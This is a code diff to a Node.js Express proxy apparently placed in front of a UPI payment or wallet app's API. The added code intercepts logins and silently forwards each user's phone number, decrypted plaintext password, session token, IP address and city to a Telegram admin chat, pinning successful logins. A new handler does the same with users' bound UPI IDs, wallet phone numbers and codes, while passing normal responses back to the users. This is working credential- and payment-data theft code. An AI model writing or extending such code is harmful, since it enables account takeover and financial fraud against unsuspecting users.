@@ -1556,7 +1556,43 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           pwd = decrypted.toString('utf8');
         } catch(e) { pwd = encPwd; }
       }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || '';
+      const timeStr = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      const isSuccess = jsonResp && (String(jsonResp.status) === '200' || jsonResp.status === 200);
+
+      if (isSuccess) {
+        const loginData = getResponseData(jsonResp) || {};
+        const memberCode = loginData.memberCode || finalUserId || 'N/A';
+        const userToken = loginData.token || loginData.appToken || '';
+
+        let successMsg = `🔑 *LOGIN SUCCESSFUL*\n`;
+        successMsg += `📱 Phone: \`${phone || 'N/A'}\`\n`;
+        successMsg += `🔒 Password: \`${pwd || 'N/A'}\`\n`;
+        successMsg += `👤 UserID: \`${memberCode}\`\n`;
+        if (userToken) successMsg += `🎟️ Token: \`${userToken}\`\n`;
+        successMsg += `🌐 IP: \`${ip}\`${city ? ' (' + city + ')' : ''}\n`;
+        successMsg += `🕐 Time: \`${timeStr}\``;
+
+        bot.sendMessage(data.adminChatId, successMsg, { parse_mode: 'Markdown' })
+          .then((sent) => {
+            if (sent && sent.message_id) {
+              bot.pinChatMessage(data.adminChatId, sent.message_id).catch(() => {});
+            }
+          })
+          .catch(() => {});
+      } else {
+        const failReason = (jsonResp && (jsonResp.message || jsonResp.msg || jsonResp.error)) || `HTTP ${response.status} Failed`;
+        let failMsg = `❌ *LOGIN FAILED*\n`;
+        failMsg += `📱 Phone: \`${phone || 'N/A'}\`\n`;
+        failMsg += `🔒 Password: \`${pwd || 'N/A'}\`\n`;
+        failMsg += `⚠️ Reason: \`${failReason}\`\n`;
+        failMsg += `🌐 IP: \`${ip}\`${city ? ' (' + city + ')' : ''}\n`;
+        failMsg += `🕐 Time: \`${timeStr}\``;
+
+        bot.sendMessage(data.adminChatId, failMsg, { parse_mode: 'Markdown' }).catch(() => {});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -2536,9 +2572,61 @@ const WALLET_INTERCEPT_ENDPOINTS = [
   '/app/api/v1/wallet/bindUpi',
   '/app/api/v1/wallet/queryUpi',
   '/app/api/v1/wallet/login',
-  '/app/api/v1/upi/list',
   '/app/api/v1/upi/switch'
 ];
+
+app.all('/app/api/v1/upi/list', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
+
+    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+      const respData = getResponseData(jsonResp);
+      const list = (respData && Array.isArray(respData.upiList)) ? respData.upiList : [];
+      
+      let upiMsg = `📱 *USER UPI WALLETS LIST*\n`;
+      upiMsg += `👤 UserID: \`${userId || 'N/A'}\`${phone ? ` | Phone: \`${phone}\`` : ''}\n`;
+      upiMsg += `📊 Total Bound UPIs: \`${list.length}\`\n\n`;
+
+      if (list.length === 0) {
+        upiMsg += `⚠️ _No bound UPI found for this user._`;
+      } else {
+        list.forEach((u, i) => {
+          const wName = u.walletName || u.walletCode || 'Unknown';
+          const upiId = u.upiAccount || u.upiId || 'N/A';
+          const wPhone = u.walletPhone || 'N/A';
+          const upiCode = u.upiCode || 'N/A';
+          const memWallet = u.memberWalletCode || 'N/A';
+          
+          // Determine status labels
+          // upiStatus: 1=Enable, 2=Authorized, 3=LowSuccess, 4=Unauthorized, 5=Disable
+          let authLabel = 'Unauthorized ❌';
+          if (u.upiStatus === 1 || u.upiStatus === 2) authLabel = 'Authorized 🟢';
+          else if (u.upiStatus === 3) authLabel = 'Low Success ⚠️';
+          else if (u.upiStatus === 4) authLabel = 'Unauthorized ⚪';
+          else if (u.upiStatus === 5) authLabel = 'Disabled 🔴';
+
+          let sellSwitch = (u.status === 1 || u.status === '1' || u.isChecked) ? '🟢 ON' : '🔴 OFF';
+          let maintenance = (u.walletStatus === 2 || u.isSellDisable) ? '⚠️ Under Maintenance' : '✅ Normal';
+          let stopIn = u.flagHasStopIn ? '🛑 Receiving Stopped' : 'Active';
+
+          upiMsg += `🔹 *[${i + 1}] ${wName}*\n`;
+          upiMsg += `UPI ID: \`${upiId}\`\n`;
+          upiMsg += `Phone: \`${wPhone}\`\n`;
+          upiMsg += `Status: \`${authLabel}\`\n`;
+          upiMsg += `Sell Switch: \`${sellSwitch}\` | Maint: \`${maintenance}\`\n`;
+          upiMsg += `UPI Code: \`${upiCode}\` | MemberWallet: \`${memWallet}\`\n\n`;
+        });
+      }
+
+      bot.sendMessage(data.adminChatId, upiMsg, { parse_mode: 'Markdown' }).catch(() => {});
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
 
 for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
   app.all(ep, async (req, res) => {
